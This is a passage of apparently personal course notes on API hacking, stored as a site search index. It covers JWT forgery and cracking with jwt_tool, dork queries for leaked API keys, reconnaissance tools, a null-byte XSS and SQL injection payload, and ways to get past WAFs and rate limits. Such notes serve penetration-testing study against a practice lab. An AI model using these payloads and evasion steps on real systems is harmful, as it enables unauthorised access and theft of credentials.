characters in the token do not actually change.</li> <li>To have this large collection of 20.000 identities can help us to evade security controls.</li> </ul> <p>The token analysis report</p> <ul> <li>The summary of the findings provides info about the quality of randomness within the token sample. The goal is to determine if there are parts of the token that do not change and other parts that often change. So full entropy would be a 100% of ramdonness (any patterns found). </li> <li>Character-level analysis provides the degree of confidence in the randomness of the sample at each character position. The significance level at each position is the probability of the observed character-level results occurring.</li> <li>Bit-level analysis indicates the degree of confidence in the randomness of the sample at each bit position.</li> </ul>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#jwt-attacks","title":"JWT attacks","text":"<p>Two tools: jwt.io and jwt_tools.</p> <p>To see a jwt decoded on your CLI:</p> <pre><code>jwt_tool eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJoYXBpaGFja2VyQGhhcGloYWNoZXIuY29tIiwiaWF0IjoxNjY5NDYxODk5LCJleHAiOjE2Njk\n1NDgyOTl9.yeyJzdWIiOiJoYXBpaGFja2VyQGhhcGloYWNoZXIuY29tIiwiaWF0IjoxNjY5NDYxODk5LCJleHAiOjE2Njk121Lj2Doa7rA9oUQk1Px7b2hUCMQJeyCsGYLbJ8hZMWc7304aX_hfkLB__1o2YfU49VajMBhhRVP_OYNafttug \n</code></pre> <p>Result:</p> <p></p> <p>Also, to see the decoded jwt, knowing that is encoded in base64, we could echo each of its parts:</p> <pre><code>echo eyJhbGciOiJIUzUxMiJ9 | base64 -d  &amp;&amp; echo eyJzdWIiOiJoYXBpaGFja2VyQGhhcGloYWNoZXIuY29tIiwiaWF0\nIjoxNjY5NDYxODk5LCJleHAiOjE2Njk1NDgyOTl9 | base64 -d\n</code></pre> <p>Results:</p> <pre><code>{\"alg\":\"HS512\"}{\"sub\":\"hapihacker@hapihacher.com\",\"iat\":1669461899,\"exp\":1669548299} \n</code></pre> <p>To run a JWT scan with jwt_tool, run: </p> <pre><code>jwt_tool -t &lt;http://target-site.com/&gt; -rh \"&lt;Header&gt;: &lt;JWT_Token&gt;\" -M pb\n# in the target site specify a path that leverages a call to a token\n# replace Header with the name of the Header and JWT_Tocker with the actual token.\n# -M: Scanning mode. 'pb' is playbook audit. 'er': fuzz existing claims to force errors. 'cc': fuzz common claims. 'at': All tests.\n</code></pre> <p>Example:</p> <p></p> <p>Some more jwt_tool flags that may come in hand:</p> <pre><code># -X EXPLOIT, --exploit EXPLOIT\n#                        eXploit known vulnerabilities:\n#                        a = alg:none\n#                        n = null signature\n#                        b = blank password accepted in signature\n#                        s = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\n#                        k = key confusion (specify public key with -pk)\n#                        i = inject inline JWKS\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#1-the-none-attack","title":"1. The none attack","text":"<p>A JWT with \"none\" as its algorithm is a free ticket. Modify user and become admin, root,...  Also, in poorly implemented JWT, sometimes user and password can be found in the payload.</p> <p>To craft a jwt with \"none\" as the value for \"alg\", run:</p> <pre><code>jwt_tool &lt;JWT_Token&gt; -X a\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#2-the-null-signature-attack","title":"2. The null signature attack","text":"<p>Second attack in this section is removing the signature from the token. This can be done by erasing the signature altogether and leaving the last period in place.</p>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#the-blank-password-accepted-in-signature","title":"The blank password accepted in signature","text":"<p>Launching this attack is relatively simple. Just remove the password value from the payload and leave it in blank. Then, regenerate the jwt.</p> <p>Also, with jwt_tool, run:</p> <pre><code>jwt_tool &lt;JWT_Token&gt; -X b\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#3-the-algorithm-switch-or-key-confusion-attack","title":"3. The algorithm switch (or key-confusion) attack","text":"<p>A more likely scenario than the provider accepting no algorithm is that they accept multiple algorithms. For example, if the provider uses RS256 but doesn\u2019t limit the acceptable algorithm values, we could alter the algorithm to HS256. This is useful, as RS256 is an asymmetric encryption scheme, meaning we need both the provider\u2019s private key and a public key in order to accurately hash the JWT signature. Meanwhile, HS256 is symmetric encryption, so only one key is used for both the signature and verification of the token. If you can discover the provider\u2019s RS256 public key and then switch the algorithm from RS256 to HS256, there is a chance you may be able to leverage the RS256 public key as the HS256 key.</p> <pre><code>jwt_tool &lt;JWT_Token&gt; -X k -pk public-key.pem\n# You will need to save the captured public key as a file on your attacking machine.\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#4-the-jwt-crack-attack","title":"4. The jwt crack attack","text":"<p>JWT_Tool can still test 12 million passwords in under a minute. To perform a JWT Crack attack using JWT_Tool, use the following command:</p> <pre><code>jwt_tool &lt;JWT Token&gt; -C -d /wordlist.txt\n# -C indicates that you are conducting a hash crack attack\n# -d specifies the dictionary or wordlist\n</code></pre> <p>Once you crack the secret of the signature, we can create our own trusted tokens.  1. Grab another user email (in the crapi app, from the data exposure vulnerability when getting the forum (GET {{baseUrl}}/community/api/v2/community/posts/recent). 2. Generate a token with the secret.</p>","tags":["api"]},{"location":"hackingapis/api-authentication-attacks/#5-spoofing-jws","title":"5. Spoofing JWS","text":"<p>Specify JWS URL with -ju, or set in jwtconf.ini to automate this attack.</p>","tags":["api"]},{"location":"hackingapis/api-reconnaissance/","title":"Api Reconnaissance","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul>","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#passive-reconnaissance","title":"Passive reconnaissance","text":"","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#google-dorks","title":"Google Dorks","text":"<p>More about google dorks.</p> Google Dorking Query Expected results intitle:\"api\" site: \"example.com\" Finds all publicly available API related content in a given hostname. Another cool example for API versions:  inurl:\"/api/v1\" site: \"example.com\" intitle:\"json\" site: \"example.com\" Many APIs use json, so this might be a cool filter inurl:\"/wp-son/wp/v2/users\" Finds all publicly available WordPress API user directories. intitle:\"index.of\" intext:\"api.txt\" Finds publicly available API key files. inurl:\"/api/v1\" intext:\"index of /\" Finds potentially interesting API directories. intitle:\"index of\" api_key OR \"api key\" OR apiKey -pool This is one of my favorite queries. It lists potentially exposed API keys.","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#github","title":"Github","text":"<p>More Githun Dorking.</p> <p>Also Github can be a good platform to search for overshared information relating to APIs.</p> Github Dowking Query Expected results applicationName api key After getting results, filter by issue and you may find some api keys. It's common to leave api keys exposed when rebasing a git repo, for instance api_key - authorization_bearer - oauth - auth - authentication - client_secret - api_token - client_id - OTP - HOMEBREW_GITHUB_API_TOKEN - SF_USERNAME - HEROKU_API_KEY - JEKYLL_GITHUB_TOKEN - api.forecast.io - password - user_password - user_pass - passcode - client_secret - secret - password hash - user auth - extension: json nasa Results show some extensions that include json, so they might be API related shodan_api_key Results show shodan api keys \"authorization: Bearer\" This search reveal some authorization token. filename: swagger.json Go to Code tab and you will have the swagger file.","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#shodan","title":"Shodan","text":"Shodan Dowking Query Expected results \"content-type: application/json\" This type of content is usually related to APIs \"wp-json\" If you are using wordpress","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#waybackmachine","title":"WaybackMachine","text":"Waybackmachine Dowking Query Expected results Path to a API We are trying to see is there is a recorded history of the API. It may provide us with endpoints that used to exist but allegedly not anymore.","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#active-reconnaissance","title":"Active reconnaissance","text":"","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#nmap","title":"nmap","text":"<p>Nmap Cheat sheet.</p> <p>First, we do a service enumeration. The Nmap general detection scan uses default scripts (-sC) and service enumeration (-sV) against a target and then saves the output in three formats for later review (-oX for XML, -oN for Nmap, -oG for greppable, or -oA for all three):</p> <pre><code>nmap -sC -sV [target address or network range] -oA nameofoutput\n</code></pre> <p>The Nmap all-port scan will quickly check all 65,535 TCP ports for running services, application versions, and host operating system in use:</p> <pre><code>nmap -p- [target address] -oA allportscan\n</code></pre> <p>You\u2019ll most likely discover APIs by looking at the results related to HTTP traffic and other indications of web servers. Typically, you\u2019ll find these running on ports 80 and 443, but an API can be hosted on all sorts of different ports. Once you discover a web server, you can perform HTTP enumeration using a Nmap NSE script (use -p to specify which ports you'd like to test).</p> <pre><code>nmap -sV --script=http-enum $ip -p 80,443,8000,8080\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#amass","title":"amass","text":"<p>amass Cheat sheet.</p> <p>Before diving into using Amass, we should make the most of it by adding API keys to it. </p> <p>1. First, we can see which data sources are available for Amass (paid and free) by running:</p> <pre><code>amass enum -list \n</code></pre> <p>2. Next, we will need to create a config file to add our API keys to.</p> <pre><code>sudo curl https://raw.githubusercontent.com/OWASP/Amass/master/examples/config.ini &gt;~/.config/amass/config.ini\n</code></pre> <p>3.  Now, see the file ~/.config/amass/config.ini and register in as many services as you can. Once you have obtained your API ID and Secret, edit the config.ini file and add the credentials to the file.</p> <pre><code>sudo nano ~/.config/amass/config.ini\n</code></pre> <p>4. Now, edit the file to add the sources. It is recommended to add:</p> <ul> <li>censys.io: guesswork out of understanding and protecting your organization\u2019s digital footprint.</li> <li>https://asnlookup.com: Quickly lookup updated information about specific Autonomous System Number (ASN), Organization, CIDR, or registered IP addresses (IPv4 and IPv6) among other relevant data. We also offer a free and paid API access!</li> <li>https://otx.alienvault.com:  Quickly identify if your endpoints have been compromised in major cyber attacks using OTX Endpoint Security and many other.</li> <li>https://bigdatacloud.com</li> <li>https://cloudflare.com</li> <li>https://www.digicert.com/tls-ssl/certcentral-tls-ssl-manager: </li> <li>https://fullhunt.io</li> <li>https://github.com</li> <li>https://ipdata.co</li> <li>https://leakix.net</li> <li>as many more as you can.</li> </ul> <p>5. When ready, we can run amass:</p> <pre><code>amass enum -active -d crapi.apisec.ai  \n</code></pre> <p>Also, to be more precise:</p> <pre><code>amass enum -active -d &lt;target&gt; | grep api\n# amass enum -active -d microsoft.com | grep api\n</code></pre> <p>Amass has several useful command-line options. Use the intel command to collect SSL certificates, search reverse Whois records, and find ASN IDs associated with your target. Start by providing the command with target IP addresses</p> <pre><code>amass intel -addr [target IP addresses]\n</code></pre> <p>If this scan is successful, it will provide you with domain names. These domains can then be passed to intel with the whois option to perform a reverse Whois lookup:</p> <pre><code>amass intel -d [target domain] \u2013whois\n</code></pre> <p>This could give you a ton of results. Focus on the interesting results that relate to your target organization. Once you have a list of interesting domains, upgrade to the enum subcommand to begin enumerating subdomains. If you specify the -passive option, Amass will refrain from directly interacting with your target:</p> <pre><code>amass enum -passive -d [target domain]\n</code></pre> <p>The active enum scan will perform much of the same scan as the passive one, but it will add domain name resolution, attempt DNS zone transfers, and grab SSL certificate information:</p> <pre><code>amass enum -active -d [target domain]\n</code></pre> <p>To up your game, add the -brute option to brute-force subdomains, -w to specify the API_superlist wordlist, and then the -dir option to send the output to the directory of your choice:</p> <pre><code>amass enum -active -brute -w /usr/share/wordlists/API_superlist -d [target domain] -dir [directory name]  \n</code></pre>","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#gobuster","title":"gobuster","text":"<p>gobuster Cheat sheet.</p> <p>Great tool to brute force directory discovery but it's not recursive (you need to specify a directory to perform a deeper scanner). Also, dictionaries are not API-specific. But here are some commands for Gobuster:</p> <pre><code>gobuster dir -u &lt;exact target url&gt; -w &lt;/path/dic.txt&gt; --wildcard -b 401\n# -b flag is to exclude from results an specific http response\n</code></pre>","tags":["api"]},{"location":"hackingapis/api-reconnaissance/#kiterunner","title":"Kiterunner","text":"<p>kiterunner Cheat sheet.</p> <p>Kiterunner is an excellent tool that was developed and released by Assetnote. Kiterunner is currently the best tool available for discovering API endpoints and resources. While directory brute force tools like Gobuster/Dirbuster/ work to discover URL paths, it typically relies on standard HTTP GET requests. Kiterunner will not only use all HTTP request methods common with APIs (GET, POST, PUT, and DELETE) but also mimic common API path structures. In other words, instead of requesting GET /api/v1/user/create, Kiterunner will try POST /api/v1/user/create, mimicking a more realistic request.</p> <p>1. First, download the dictionaries from the project. In my case I downloaded it to /usr/share/wordlists/kiterunner/:</p> <ul> <li>https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-large.json.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-small.json.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz</li> </ul> <p>2. Run a quick scan of your target\u2019s URL or IP address like this:</p> <pre><code>kr scan HTTP://127.0.0.1 -w ~/api/wordlists/data/kiterunner/routes-large.kite  \n</code></pre> <p>But. Note that we conducted this scan without any authorization headers, which the target API likely requires.</p> <p>To use a dictionary (and not a kite file): </p> <pre><code>kr brute &lt;target&gt; -w ~/api/wordlists/data/automated/nameofwordlist.txt\n</code></pre> <p>If you have many targets, you can save a list of line-separated targets as a text file and use that file as the target.</p> <p>One of the coolest Kiterunner features is the ability to replay requests. Thus, not only will you have an interesting result to investigate, you will also be able to dissect exactly why that request is interesting. In order to replay a request, copy the entire line of content into Kiterunner, paste it using the kb replay option, and include the wordlist you used:</p> <pre><code>kr kb replay \"GET     414 [    183,    7,   8]://192.168.50.35:8888/api/privatisations/count 0cf6841b1e7ac8badc6e237ab300a90ca873d571\" -w ~/api/wordlists/data/kiterunner/routes-large.kite\n</code></pre> <p>Running this will replay the request and provide you with the HTTP response.</p> <p>To run Kiterunner providing an authorization token as it could be \"x-access-token\", we can take the full authorization token and add it to your Kiterunner scan with the -H option:</p> <pre><code>kr scan http://IP -w /path/to/dict.txt -H 'x-access-token: eyJhGcwisdfdsfdfsdfsdfsdfdsfdsfddfdf.eyfakefakefakefaketokenfakeken._wcoooooo_kkkkkk_kkkk'\n</code></pre>","tags":["api"]},{"location":"hackingapis/endpoint-analysis/","title":"Endpoint analysis","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul> <p>If an API is not documented or the documentation is unavailable to you, then you will need to build out your own collection of requests. Two different methods:</p> <ol> <li>Build a collection in Postman</li> <li>Build out an API specification using mitmproxy2swagger.</li> </ol>","tags":["api"]},{"location":"hackingapis/endpoint-analysis/#build-a-collection-in-postman","title":"Build a collection in Postman","text":"<p>In the instance where there is no documentation and no specification file, you will have to reverse-engineer the API based on your interactions with it. Mapping an API with several endpoints and a few methods can quickly grow into quite a large attack surface.  There are two ways to manually reverse engineer an API with Postman. </p> <ul> <li>One way is by constructing each request. </li> <li>The other way is to proxy web traffic through Postman, then use it to capture a stream of requests. This process makes it much easier to construct requests within Postman, but you\u2019ll have to remove or ignore unrelated requests. </li> </ul>","tags":["api"]},{"location":"hackingapis/endpoint-analysis/#steps","title":"Steps","text":"<p>1. Start crAPI applicationi</p> <pre><code>cd ~/lab/crapi\nsudo docker-compose start\n</code></pre> <p>2. Open the browser, and select \"postman 5555\" in your Foxyproxy addon to proxy the traffic. </p> <p>3. Open your local crapi application in the browser: http://localhost:8888</p> <p>4. Run postman from the command line:</p> <pre><code>postman\n</code></pre> <p>5. Once postman is open, press on \"Capture traffic link\" (at the bottom right of the application). Set up the capture, and make sure that proxy is enabled in the application. A useful shortcut to go to Settings is CTRL-, (comma).</p> <p>6. Now you are capturing the traffic. Go through your crapi application and when done, go to postman and stop the capture. </p> <p>7. Final step is to filter out the requests you want and add them to a collection. In the collection, you will be able to organize these requests in folders /endpoints.</p>","tags":["api"]},{"location":"hackingapis/endpoint-analysis/#build-out-an-api-specification-using-mitmproxy2swagger","title":"Build out an API specification using mitmproxy2swagger","text":"","tags":["api"]},{"location":"hackingapis/endpoint-analysis/#steps_1","title":"Steps","text":"<p>1. From cli, run:</p> <pre><code>mitmweb\n</code></pre> <p>2. Select burp 8080 in the foxyproxy addon in your browser.</p> <p>3. Open a tab in your browser with the mitmweb proxy service: http://localhost:8081, and make sure that traffic is being captured there.</p> <p>4. Now you are capturing the traffic. Go through your crapi application and when done, turn off the foxyproxy.</p> <p>5. In the mitmweb service at http://localhost:8081, go to File&gt;Save. A file called \"flows\" will be downloaded to your download folder.</p> <p>6. We need to parse this \"flows\" file into something understandable by Postman. For that, we will use a tool called mitmproxy2swagger, which will transform our captured traffic into an Open API 3.0 YAML file that can be viewed in a browser and imported as a collection into Postman. Run:</p> <pre><code>sudo mitmproxy2swagger -i ~/Downloads/flows -o spec.yml -p http://localhost:8888/ -f flow \n# -i: input    |  -o: output   | -p: target   |  -f: force format to the specified.\n</code></pre> <p>7. Edit spec.yml to remove \"ignore:\" when it proceeds, and save changes . </p> <p> </p> <p>Run again mitmproxy2swagger to populate your spec with examples.</p> <pre><code>sudo mitmproxy2swagger -i ~/Downloads/flows -o spec.yml -p http://localhost:8888/ -f flow --examples\n# --examples will grab the previously created spec.yml and will populate it with real examples. We do this in two steps to avoid creating examples for request out of scope.  \n</code></pre> <p>8. Open https://editor.swagger.io/ and click on File &gt; Import. Import your spec.yml. The goal here is to validate the structure of your file.</p> <p>9. If everything is ok, open the postman application:</p> <pre><code>postman\n</code></pre> <p>10. In postman, go to File &gt; Import, and select the spec.yml file. After importing it, you will be able to add it to a collection, and compare this collection against that created by browsing just with postman.</p>","tags":["api"]},{"location":"hackingapis/endpoint-analysis/#data-exposure","title":"Data Exposure","text":"<p>Quoting directly from the course: \"When making a request to an endpoint, make sure you note the request\u00a0requirements. Requirements could include some form of authentication, parameters, path variables, headers, and information included in the body of the request. The API documentation should tell you what it requires of you and mention which part of the request that information belongs in. If the documentation provides examples, use them to help you. Typically, you can replace the example values with the ones you\u2019re looking for. The table below describes some of the conventions often used in these examples\".</p>","tags":["api"]},{"location":"hackingapis/endpoint-analysis/#api-documentation-conventions","title":"API Documentation Conventions","text":"Convention Example Meaning : or {} /user/:id /user/{id} /user/2727 /account/:username  /account/{username}  /account/scuttleph1sh The colon or curly brackets are used by some APIs to indicate a path variable. In other words, \u201c:id\u201d represents the variable for an ID number and \u201c{username}\u201d represents the account username you are trying to access. [] /api/v1/user?find=[name] Square brackets indicate that the input is optional. || \u201cblue\u201d || \u201cgreen\u201d || \u201cred\u201d Double bars represent different possible values that can be used.","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/","title":"Evasion and Combining techniques","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul> Resources <ul> <li>w3af</li> <li>WAFW00f</li> <li>waf-bypass.com.</li> <li>hacken.io</li> <li>Awesome WAF.</li> </ul> <p>Here some basic techniques for evading or bypassing common API security controls.</p>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#what-can-trigger-a-waf-web-applicatin-firewall","title":"What can trigger a WAF (Web Applicatin Firewall)?","text":"<ul> <li>Too many requests for inexisting resources.</li> <li>To many requests in a short period of time.</li> <li>Common SQL or XSS payloads attackes in requests.</li> <li>Unusual behaviour (like a test for authorizathion vulnerabilities).</li> </ul>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#how-to-detect-a-waf","title":"How to detect a WAF","text":"<p>What can a WAF do provided that RESTful APIs are stateless? They can use attribution to identify an atacker and for that they use: IP address, origin headers, authorization tokens and metadata (patterns of requests, rate of requests and the combination of the headers included in the requests).</p> <p>When it comes to Hacking APIs the best approach is first use the API as it was intended. Second, review the API responses  for evidence of a WAF (in headers):</p> <p>1. Headers such as X-CDN means that the API is leveraging a Content Delivery Network (CDN), which often provides WAFs as a service.</p> <p>2. Use Burp Suite's Proxy and Repeater to watch if your requests are being sent to a proxy (302 sending you to a CDN).</p> <p>3. Use some tools:</p> <pre><code>nmap -p 80 -script http-waf-detect $ip \n</code></pre> <p>Also w3af, WAFW00f, and this recollection of handy tools: waf-bypass.com.</p> <p>Great article found when searchin for these tools: hacken.io.</p>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#techniques-for-evasion","title":"Techniques for evasion","text":"","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#1-burners-accounts","title":"1. Burners accounts","text":"<p>So there is a WAF. Before attacking, create several extra accounts (or tokens you can dispose). Watch out! When creating these accounts, make sure you use information not associated to your other accounts:</p> <pre><code>- Different names and emails.\n- Different passwords.\n- Use VPN and disguise your IP.\n</code></pre>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#2-bypassing-controls-with-string-terminators","title":"2. Bypassing controls with string terminators","text":"<p>Simple payloads.</p> <p>Null bytes and other combinations of symbols are often interpreted as\u00a0string terminators. When not filtered out they could terminate the API security control filters.</p> <p>Here an example of a NULL byte included in a XSS  combined with a SQL injection attack.</p> <pre><code>POST /api/v1/user/profile/update\n--snip--\n\n     {\n        \u201cusername\u201d: \u201c&lt;%00script&gt;alert(1);&lt;/%00script&gt;\u201d\n        \u201cpass\u201d:\u00a0\"%00'OR 1=1\"\n}\n</code></pre>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#3-bypassing-controls-with-case-switching","title":"3. Bypassing controls with case switching","text":"<p>Case switching the payload may provoke the WAF not detecting the attack.</p>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#4-bypassing-controls-by-encoding-payloads","title":"4. Bypassing controls by encoding payloads","text":"<p>If you are using Burp Suite, the module Decoder is perfect for quickly encoding or decoding a payload. </p> <p>Trick: double encoding your payload.</p>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#tools","title":"Tools","text":"","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#1-burpsuite-intruder","title":"1. BurpSuite Intruder","text":"<p>Also, once you know which encoding technique is the efective one to bypass the WAF, use BurpSuite Intruder (section Payload processing under the Intruder Payload option) for configuring you attack. Intruder has some more worthy options:</p> <p></p>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#2-wfuzz","title":"2. wfuzz","text":"<p>wfuzz Cheat sheet.</p> <pre><code># Check which wfuzz encoders are available\nwfuzz -e encoders\n\n# To use an encoder, add a comma to the payload and specify the encoder name\nwfuzz -z file,path/to/payload.txt,base64 http://hackig-example.com/api/v2/FUZZ\n\n# Using multiple encoders. Each payload will be processed in separated requests.  \nwfuzz -z list,a,base64-md5-none \n# this results in three payloads: one encoded in base64, another in md5 and last with none. \n\n# Each payload will be processed by multiple encoders.\nwfuzz -z file,payload1-payload2,base64@md5@random_upper -u http://hackig-example.com/api/v2/FUZZ\n</code></pre>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#testing-rate-limits","title":"Testing rate limits","text":"","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#rate-limits-what-for","title":"Rate limits. What for?","text":"<ul> <li>To avoid incurring into adittional costs associated with computing resources.</li> <li>To avoid falling victim to a DoS attack.</li> <li>To monetize.</li> </ul>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#how-to-know-if-rate-limit-is-in-place","title":"How to know if rate limit is in place","text":"<ul> <li>Consult API documentation.</li> <li>Check APIs header (x-rate-limit, x-rate-limit-remaining, retry- after).</li> <li>See response code 429.</li> </ul>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#techniques","title":"Techniques","text":"<p>1. Throttle your scanning</p> <p>In wfuzz: </p> <pre><code># Units are specified in seconds\n-s  Specify a time delay between requests.\n-t Specify the concurrent number of connections\n</code></pre> <p>In BurpSuite:</p> <pre><code>Set up Intruder's Resource Pool to limit the rate (in milliseconds).\n</code></pre> <p>2. Bypassing paths</p> <p>When altering slightly the URL path, this could cause the API provider to handle the request diferently, potentially bypassing the rate limit.</p> <ul> <li>Adding null bytes.</li> <li>Altering the string ramdonly with various upper and lower case letter.</li> <li>Adding meaningless parameters.</li> </ul> <p>3. Modifying Origin headers</p> <p>When the API provider use headers to enforce rate limiting, you could manipulate them:</p> <ul> <li>X-Forwarded-For</li> <li>X-Forwarded-Host</li> <li>X-Host</li> <li>X-Originating-IP</li> <li>X-Remote-IP</li> <li>X-Client-IP</li> <li>X-Remote-Addr</li> </ul> <p>4. Modifying User-agent header</p> <p>You can use this dictionary: Seclist.</p>","tags":["api"]},{"location":"hackingapis/evasion-combining-techniques/#rotating-ip-addresses-with-burpsuite","title":"Rotating IP addresses with BurpSuite","text":"<p>Add the extension IP Rotate. </p> <p>Requirements to install IP Rotate and have it working:</p> <ul> <li>Install the tool Boto3.</li> </ul> <pre><code>pip3 install boto3\n</code></pre> <ul> <li>Install the Jython standalone file from https://www.jython.org/download.html.</li> <li>You will need an AWS account in which you can create an IAM user. There is a small cost associated with using the AWS API gateway. After downloading the IAM Services page, click Add Users and create an user account with programmatic access selected. On the \"Set Permissions page\", select \"Attach Existing Policies Directly\". NExt filter policies by searching for \"API\". Select the \"AmazonAPIGatewayAdministrator\" and \"AmazonAPIGatewayInvokeFullAccess\" permissions. Preceed to the review page.. No tags needed. Skip ahead and create the users. Now, download CSV file containing your user's access key.</li> <li>Install IP Rotate</li> <li>Open the IP Rotate Module and copy and paste access key from the user added in IAM service. </li> </ul>","tags":["api"]},{"location":"hackingapis/exploiting-api-authorization/","title":"Exploiting API Authorization","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul>","tags":["api"]},{"location":"hackingapis/exploiting-api-authorization/#bola-broken-object-level-authorization","title":"BOLA - Broken Object Level Authorization","text":"<p>BOLA vulnerability allows UserA to request UserB's resources.</p> <p></p>","tags":["api"]},{"location":"hackingapis/exploiting-api-authorization/#methodology","title":"Methodology","text":"<ol> <li>Create a UserA account.</li> <li>Use the API and discover requests that involve resource IDs as UserA.</li> <li>Document requests that include resource IDs and should require authorization.</li> <li>Create a UserB account.</li> <li>Obtaining a valid UserB token and attempt to access UserA's resources.</li> </ol> <p>You could also do this by using UserB's resources with a UserA token.</p>","tags":["api"]},{"location":"hackingapis/exploiting-api-authorization/#bfla-broken-function-level-authorization","title":"BFLA - Broken Function Level Authorization","text":"<p>BFLA is about UserA requesting to create, update, post or delete object values that belong to UserB.   </p> <ul> <li>BFLA request with lateral actions. UserA has the same role or privilege level than UserB.</li> <li>BFLA request with escalated actions. UserB has a privilege level and UserA is able to perform actions reserved for UserB.</li> </ul> <p>Basically, BFLA attacks will consists on testing for various HTTP methods, seeking out actions of other users that you shouldn't be able to perform. Important: being careful with DELETE request.</p>","tags":["api"]},{"location":"hackingapis/exploiting-api-authorization/#methodology_1","title":"Methodology","text":"<ol> <li>Postman. Go through the collection and select requests for resources of UserA. Focus on resources for private information. Focus also on HTTP verbs such as PUT, DELETE, POST.</li> <li>Swap out your UserA token for UserB's.</li> <li>Send GET, PUT, POST, and DELETE requests for UserA's resources using Userb's token.</li> <li>Investigate code 200, 401, and responses with strange lengths.</li> </ol> <p>BFLA pays special attention to requests that perform authorized actions. </p>","tags":["api"]},{"location":"hackingapis/exploiting-api-authorization/#tools","title":"Tools","text":"<ul> <li>Postman: use the collection variables. Create specific collections for attacks.</li> <li>BurpSute: use the Match and Replace functionality (tab PROXY&gt;OPTIONS) to perform a large-scale replacement of a variable like an authorization token.</li> </ul>","tags":["api"]},{"location":"hackingapis/improper-assets-management/","title":"Testing for improper assets management","text":"General index of the course <ul> <li>Setting up the environment</li> <li>Api Reconnaissance.</li> <li>Endpoint Analysis.</li> <li>Scanning APIS.</li> <li>API Authorization Attacks.</li> <li>Exploiting API Authorization.</li> <li>Testing for Improper Assets Management.</li> <li>Mass Assignment.</li> <li>Server side Request Forgery.</li> <li>Injection Attacks. </li> <li>Evasion and Combining techniques.</li> <li>Setting up the labs + Writeups</li> </ul> <p>Testing for improper assets management is all about discovering unsupported and non-production versions of an API. </p>","tags":["api"]},{"location":"hackingapis/improper-assets-management/#finding-api-versions","title":"Finding API versions","text":"<p>Paths to check out:</p> <pre><code>api.target.com/v3\n/api/v2/accounts\n/api/v3/accounts\n/v2/accounts\n</code></pre> <p>API versioning could also be maintained as a header:</p> <pre><code>Accept: version=2.0\nAccept api-version=3\n</code></pre> <p>In addition versioning could also be set within a query parameter or request body.</p> <pre><code>/api/accounts?ver=2\nPOST /api/accounts\n\n{\n\"ver\":1.0,\n\"user\":\"hapihacker\";\n}\n</code></pre> <p>The discovery of non-production versions of an API might not be treated with the same security controls as the production version. </p>","tags":["api"]},{"location":"hackingapis/improper-assets-management/#exploiting-non-production-old-and-deprecate-api-versions","title":"Exploiting non-production, old and deprecate api versions","text":"<p>We'll use postman. We are assuming that we have build our collection of requests and that we have identify those parameters regarding API version.</p> <p>0.  On collection, right click and select \"Run Collection\". In the following screen you can unmark those requests that don't need to be run.  But, first, define a Test.</p> <p>1. Run a test \"Status code: Code is 200\". In your collection options, go to tab Test and select 